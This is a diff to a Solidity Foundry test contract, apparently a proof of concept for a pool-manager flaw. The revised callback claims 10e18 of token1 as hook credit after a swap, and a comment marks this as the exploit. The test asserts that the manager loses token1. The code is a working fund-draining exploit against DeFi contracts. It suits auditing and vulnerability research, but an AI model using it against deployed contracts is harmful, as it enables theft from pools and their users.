@@ -56,28 +56,25 @@ contract POC is Test {
             if(d.amount1()>0) manager.take(c1, address(this), uint128(d.amount1()));
         } else {
             BalanceDelta s = manager.swap(key, SwapParams(false,-0.1e18,TickMath.MAX_SQRT_PRICE-1), "");
-            console.log("SWAP s0:");
-            console.logInt(s.amount0());
-            console.log("SWAP s1:");
-            console.logInt(s.amount1());
-
-            if(s.amount0()<0){manager.sync(c0); token0.transfer(address(manager), uint128(-s.amount0())); manager.settle(); console.log("settled s0 negative");}
-            if(s.amount1()<0){manager.sync(c1); token1.transfer(address(manager), uint128(-s.amount1())); manager.settle(); console.log("settled s1 negative");}
-            if(s.amount0()>0){manager.take(c0, address(this), uint128(s.amount0())); console.log("took s0 positive");}
-            if(s.amount1()>0){manager.take(c1, address(this), uint128(s.amount1())); console.log("took s1 positive");}
-
-            console.log("Now taking hook credit 10e18 token0");
-            manager.take(c0, address(this), 10e18);
+            // BOTH are negative, settle both
+            if(s.amount0()<0){manager.sync(c0); token0.transfer(address(manager), uint128(-s.amount0())); manager.settle();}
+            if(s.amount1()<0){manager.sync(c1); token1.transfer(address(manager), uint128(-s.amount1())); manager.settle();}
+            if(s.amount0()>0) manager.take(c0, address(this), uint128(s.amount0()));
+            if(s.amount1()>0) manager.take(c1, address(this), uint128(s.amount1()));
+            // HOOK CREDIT IS FOR TOKEN1 - THIS IS THE EXPLOIT
+            manager.take(c1, address(this), 10e18);
         }
         return "";
     }
 
     function test_afterSwapReturnDelta() public {
-        uint bBefore = token0.balanceOf(address(manager));
+        uint bBefore0 = token0.balanceOf(address(manager));
+        uint bBefore1 = token1.balanceOf(address(manager));
         manager.unlock(abi.encode(uint256(2)));
-        uint bAfter = token0.balanceOf(address(manager));
-        console.log("MANAGER token0 LOSS:");
-        console.logInt(int256(bBefore) - int256(bAfter));
-        assertLt(bAfter, bBefore);
+        uint bAfter0 = token0.balanceOf(address(manager));
+        uint bAfter1 = token1.balanceOf(address(manager));
+        console.log("MANAGER LOSS token0:", bBefore0 - bAfter0);
+        console.log("MANAGER LOSS token1:", bBefore1 - bAfter1);
+        assertTrue(bAfter1 < bBefore1, "manager should lose token1");
     }
 }
